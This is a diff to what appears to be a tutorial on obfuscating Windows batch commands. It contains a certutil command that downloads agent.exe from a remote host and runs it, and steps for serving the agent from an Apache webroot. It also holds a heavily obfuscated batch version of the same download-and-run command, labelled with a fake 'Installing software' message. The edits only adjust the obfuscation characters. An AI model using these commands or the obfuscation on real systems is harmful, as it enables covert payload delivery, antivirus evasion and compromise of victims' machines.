@@ -190,6 +190,8 @@ The above string can be obfuscated using the **batch special character: "** <br 
 - String command to obfuscate<br />
 `cmd.exe /c certutil.exe -urlcache -split -f http://192.168.1.69/agent.exe agent.exe && start agent.exe`<br />
 
+<br />
+
       1º - Store your agent.exe into your apache webroot (linux)
       cp agent.exe /var/www/html/agent.exe
 
@@ -206,7 +208,7 @@ The above string can be obfuscated using the **batch special character: "** <br 
       @echo off
       sEt e=!h&& sEt c=db&& sEt a=0x
       echo [+] Please Wait, Installing software ..
-      ;%d^b%M%A%d"."eX%!h% /%db% @%db%e"r"Tu%C%tIl.%!h%^xe -uR%A%l%db%%0x%ch%!h% -sP%F%l^It -f ht%D%tp://192.168.1.69/%0x%g%!h%Nt.E^x%!h% %0x%Ge%T%N^t.%!h%^xE && s^t%0x%r%K%T %0x%"g"%!h%Nt.e%H%x%!h%
+      ;%d^b%M%A%d"."eX%!h% /%db% @%db%e"r"Tu%C%tIl.%!h%^xe -u^R%A%l%db%%0x%ch%!h% -sP%F%l^I%O%t -f ht%D%tp://192.168.1.69/%0x%g%!h%Nt.E^x%!h% %0x%Ge%T%N^t.%!h%^xE && s^t%0x%r%K%T %0x%"g"%!h%Nt.e%H%x%!h%
       exit
 
 ![batch obfuscation certutil.bat](http://i.)
